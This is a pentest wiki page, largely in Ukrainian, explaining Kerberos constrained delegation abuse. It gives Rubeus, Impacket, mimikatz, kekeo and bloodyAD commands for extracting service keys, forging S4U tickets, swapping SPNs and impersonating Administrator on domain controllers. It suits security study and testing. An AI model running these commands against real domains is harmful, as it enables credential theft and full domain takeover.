# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

За допомогою цього Domain admin може **дозволити** комп’ютеру **імперсонувати користувача або комп’ютер** під час доступу до будь-якого **сервісу** машини.

- **Service for User to self (_S4U2self_):** Будь-який **service account, який володіє SPN**, зазвичай може отримати TGS для себе від імені довільного користувача. Якщо цей обліковий запис також має [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) у _userAccountControl_, цей TGS є **forwardable**, що і робить protocol transition безпосередньо корисним для **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** **service account** може отримати TGS від імені користувача для SPN, перелічених у **msDS-AllowedToDelegateTo**. Evidence ticket, який використовується в S4U2Proxy, має бути **forwardable** ticket до сервісу, якому делегують: або справжнім client-to-service ticket, перехопленим у victim, або створеним за допомогою **S4U2Self + T2A4D**.

**Примітка**: Якщо користувач позначений в AD як ‘_Account is sensitive and cannot be delegated_’ або є членом **Protected Users**, зазвичай ви **не зможете імперсонувати** його через constrained delegation. У сучасних доменах під час роботи з обліковими записами, для яких увімкнено delegation, віддавайте перевагу **AES** material, а не припущенням, що доступний лише RC4.

Це означає, що якщо ви **скомпрометуєте hash сервісу**, то зможете **імперсонувати користувачів** і отримати **доступ** від їхнього імені до будь-якого **сервісу** на вказаних машинах (можливий **privesc**).

Крім того, ви матимете доступ **не лише до сервісу, який користувач може імперсонувати, а й до будь-якого сервісу**, оскільки SPN (ім’я сервісу, яке запитується) не перевіряється (у ticket ця частина не зашифрована та не підписана). Тому, якщо ви маєте доступ до **CIFS service**, ви також можете отримати доступ до **HOST service**, наприклад, використовуючи прапорець `/altservice` у Rubeus. Та сама weakness із підміною SPN використовується в **Impacket getST -altservice** та інших tooling.

Також саме **LDAP service access on DC** потрібен для експлуатації **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Примітка оператора:** не довіряйте лише скриншотам **ADUC** або BloodHound під час перевірки **gMSA/sMSA**. У таких облікових записів часто відсутня звична вкладка Delegation, тому безпосередньо перелічуйте необроблені атрибути **`userAccountControl`** і **`msDS-AllowedToDelegateTo`**.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition vs Kerberos-only constrained delegation

Якщо скомпрометований акаунт має **T2A4D**, зазвичай можна виконати повний ланцюжок **`S4U2Self -> S4U2Proxy`**, маючи лише ключ служби/TGT.<sup>[[2]](#references)</sup>

Якщо він має лише **`msDS-AllowedToDelegateTo`** (класичний режим **"Use Kerberos only"**), delegation усе ще може бути придатною для зловживання, але evidence ticket для S4U2Proxy має бути **справжнім forwardable user-to-service ticket** для delegating service. На практиці це означає викрадення або перехоплення victim TGS з **LSASS/ccache** і передачу його на другий етап (`/tgs:` у Rubeus). **Non-forwardable** S4U2Self ticket недостатній для classic constrained delegation; якщо це ваш єдиний evidence ticket, перевірте [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Нотатки щодо cross-domain constrained delegation (2025+)

Починаючи з **Windows Server 2012/2012 R2**, KDC підтримує **constrained delegation між доменами/forest** через розширення S4U2Proxy. Сучасні збірки (Windows Server 2016–2025) зберігають цю поведінку та додають два PAC SID для позначення protocol transition:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) коли користувач автентифікувався звичайним способом.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) коли служба підтвердила identity через protocol transition.

Очікуйте `SERVICE_ASSERTED_IDENTITY` усередині PAC, коли protocol transition використовується між доменами, що підтверджує успішне виконання кроку S4U2Proxy.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Останні версії Impacket (0.11.x+) реалізують той самий S4U chain і SPN swapping, що й Rubeus:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Якщо ви віддаєте перевагу спочатку підробити user ST (наприклад, маючи лише offline hash), використовуйте **ticketer.py** разом із **getST.py** для S4U2Proxy. **tgssub.py** також стане в пригоді, якщо у вас уже є робочий ccache і потрібно лише замінити service class для того самого хоста. Перегляньте актуальні нюанси у відкритому issue Impacket #1713 (KRB_AP_ERR_MODIFIED, коли підроблений ST не відповідає ключу SPN).<sup>[[2]](#references)</sup>

### Автоматизація налаштування delegation із low-priv creds

Якщо ви вже маєте **GenericAll/WriteDACL** для computer або service account, можна віддалено додати необхідні attributes без RSAT за допомогою **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Це дає змогу побудувати шлях constrained delegation для privesc без привілеїв DA, щойно ви зможете записувати ці атрибути.

- Step 1: **Отримайте TGT дозволеного сервісу**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Є **інші способи отримати TGT ticket**, **RC4** або **AES256**, не маючи SYSTEM на комп'ютері, наприклад Printer Bug, unconstrained delegation, NTLM relaying і Active Directory Certificate Service abuse
>
> **Маючи лише цей TGT ticket (або його хеш), ви можете виконати цю атаку, не компрометуючи весь комп'ютер.**

- Крок 2: **Отримайте TGS для service, impersonating the user**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Більше інформації на ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) та [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Огляд Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Зловживання делегацією за допомогою Impacket (частина 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity знищила домен: огляд Offensive Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
{{#include ../../banners/hacktricks-training.md}}
